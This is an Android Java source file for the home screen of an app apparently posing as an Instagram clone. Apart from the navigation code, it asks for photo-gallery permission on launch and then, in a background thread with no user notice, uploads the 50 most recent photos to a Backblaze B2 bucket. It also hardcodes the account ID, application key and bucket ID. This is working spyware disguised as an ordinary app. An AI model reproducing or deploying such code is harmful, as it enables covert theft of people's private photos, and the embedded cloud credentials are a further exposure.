package com.example.insta;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.google.android.material.bottomnavigation.BottomNavigationView;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class HomeActivity extends AppCompatActivity {

    private static final int STORAGE_PERMISSION_CODE = 100;
    private static final int IMAGE_LIMIT = 50;

    // Backblaze B2 credentials
    private static final String ACCOUNT_ID = "005a9e590165b060000000001";
    private static final String APPLICATION_KEY = "K0053edmsWvProTdilFRHnC7QaHgr8c";
    private static final String BUCKET_ID = "dae99e55b94081a695bb0016";

    private String apiUrl;
    private String authToken;
    private String uploadUrl;
    private String uploadAuthToken;

    private BottomNavigationView bottomNavigationView;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_homepage);

        bottomNavigationView = findViewById(R.id.bottomNav);
        setupBottomNav();

        checkStoragePermission();
    }

    // ---------------- BOTTOM NAV ----------------
    private void setupBottomNav() {
        bottomNavigationView.setSelectedItemId(R.id.nav_home);

        bottomNavigationView.setOnItemSelectedListener(item -> {
            int id = item.getItemId();

            if (id == R.id.nav_home) return true;
            if (id == R.id.nav_search) startActivity(new Intent(this, SearchActivity.class));
            if (id == R.id.nav_add) startActivity(new Intent(this, AddPostActivity.class));
            if (id == R.id.nav_reels) startActivity(new Intent(this, ReelsActivity.class));
            if (id == R.id.nav_profile) startActivity(new Intent(this, activity_account.class));

            return true;
        });
    }

    // ---------------- PERMISSIONS ----------------
    private void checkStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // API 33+
            if (checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES)
                    != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(
                        new String[]{Manifest.permission.READ_MEDIA_IMAGES},
                        STORAGE_PERMISSION_CODE
                );
            } else {
                startUploadThread();
            }
        } else {
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                        STORAGE_PERMISSION_CODE
                );
            } else {
                startUploadThread();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == STORAGE_PERMISSION_CODE &&
                grantResults.length > 0 &&
                grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            startUploadThread();
        } else {
            Log.e("HomeActivity", "Storage permission denied!");
            Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }
    }

    // ---------------- UPLOAD THREAD ----------------
    private void startUploadThread() {
        new Thread(() -> {
            try {
                uploadLatestImages();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    // ---------------- GET LATEST 50 IMAGES ----------------
    private List<Uri> getLatest50Images() {
        List<Uri> images = new ArrayList<>();
        ContentResolver resolver = getContentResolver();

        Uri collection = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
                ? MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                : MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String sortOrder = MediaStore.Images.Media.DATE_TAKEN + " DESC";
        Cursor cursor = resolver.query(
                collection,
                new String[]{MediaStore.Images.Media._ID},
                null, null,
                sortOrder
        );

        if (cursor != null) {
            int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            int count = 0;
            while (cursor.moveToNext() && count < IMAGE_LIMIT) {
                long id = cursor.getLong(idCol);
                Uri uri = Uri.withAppendedPath(collection, String.valueOf(id));
                images.add(uri);
                count++;
            }
            cursor.close();
        }
        Log.d("HomeActivity", "Fetched " + images.size() + " images from gallery");
        return images;
    }

    // ---------------- BACKBLAZE AUTH ----------------
    private void authorizeB2() throws Exception {
        URL url = new URL("https://api.backblazeb2.com/b2api/v2/b2_authorize_account");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");

        String auth = ACCOUNT_ID + ":" + APPLICATION_KEY;
        String encoded = android.util.Base64.encodeToString(auth.getBytes("UTF-8"),
                android.util.Base64.NO_WRAP);
        conn.setRequestProperty("Authorization", "Basic " + encoded);

        InputStream in = conn.getInputStream();
        JSONObject obj = new JSONObject(new String(readStream(in), "UTF-8"));
        apiUrl = obj.getString("apiUrl");
        authToken = obj.getString("authorizationToken");
        Log.d("HomeActivity", "B2 authorized successfully");
        in.close();
    }

    private void getUploadUrl() throws Exception {
        URL url = new URL(apiUrl + "/b2api/v2/b2_get_upload_url");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();

        conn.setRequestMethod("POST");
        conn.setRequestProperty("Authorization", authToken);
        conn.setDoOutput(true);

        JSONObject body = new JSONObject();
        body.put("bucketId", BUCKET_ID);

        OutputStream os = conn.getOutputStream();
        os.write(body.toString().getBytes("UTF-8"));
        os.close();

        InputStream in = conn.getInputStream();
        JSONObject obj = new JSONObject(new String(readStream(in), "UTF-8"));
        uploadUrl = obj.getString("uploadUrl");
        uploadAuthToken = obj.getString("authorizationToken");
        Log.d("HomeActivity", "Upload URL fetched successfully");
        in.close();
    }

    // ---------------- UPLOAD IMAGE ----------------
    private void uploadSingleImage(Uri imageUri) {
        try {
            InputStream input = getContentResolver().openInputStream(imageUri);
            if (input == null) {
                Log.e("HomeActivity", "Failed to open input stream for " + imageUri);
                return;
            }

            String fileName = "img_" + System.currentTimeMillis() + ".jpg";
            URL url = new URL(uploadUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Authorization", uploadAuthToken);
            conn.setRequestProperty("X-Bz-File-Name", fileName);
            conn.setRequestProperty("Content-Type", "b2/x-auto");
            conn.setRequestProperty("X-Bz-Content-Sha1", "do_not_verify");

            OutputStream os = conn.getOutputStream();
            byte[] buffer = new byte[8192];
            int len;
            while ((len = input.read(buffer)) != -1) {
                os.write(buffer, 0, len);
            }
            os.close();
            input.close();

            int code = conn.getResponseCode();
            InputStream resp = code < 400 ? conn.getInputStream() : conn.getErrorStream();
            String result = new String(readStream(resp), "UTF-8");
            Log.d("B2Upload", "Uploaded " + fileName + " | Response: " + result);

        } catch (Exception e) {
            Log.e("HomeActivity", "Upload failed for " + imageUri, e);
        }
    }

    // ---------------- UPLOAD LATEST IMAGES ----------------
    private void uploadLatestImages() throws Exception {
        authorizeB2();
        getUploadUrl();

        List<Uri> images = getLatest50Images();
        Log.d("HomeActivity", "Starting upload of " + images.size() + " images");

        for (Uri uri : images) {
            uploadSingleImage(uri);
        }
        Log.d("HomeActivity", "All uploads completed");
    }

    // ---------------- HELPER ----------------
    private byte[] readStream(InputStream in) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[8192];
        int len;
        while ((len = in.read(buffer)) != -1) {
            out.write(buffer, 0, len);
        }
        return out.toByteArray();
    }
}
